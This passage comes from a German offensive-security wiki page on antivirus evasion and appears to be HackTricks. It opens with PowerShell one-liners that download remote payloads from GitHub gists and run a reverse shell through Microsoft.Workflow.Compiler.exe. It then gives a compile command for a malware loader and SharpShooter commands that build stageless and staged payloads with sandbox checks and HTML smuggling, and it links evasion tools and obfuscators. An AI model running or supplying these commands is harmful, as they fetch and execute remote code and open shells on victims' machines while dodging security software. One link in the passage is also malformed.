Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# Obfuskatoren Liste: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Verwendung von Python für den Build-Injektor-Beispiel:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Andere Werkzeuge
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

{{#include ../banners/hacktricks-training.md}}
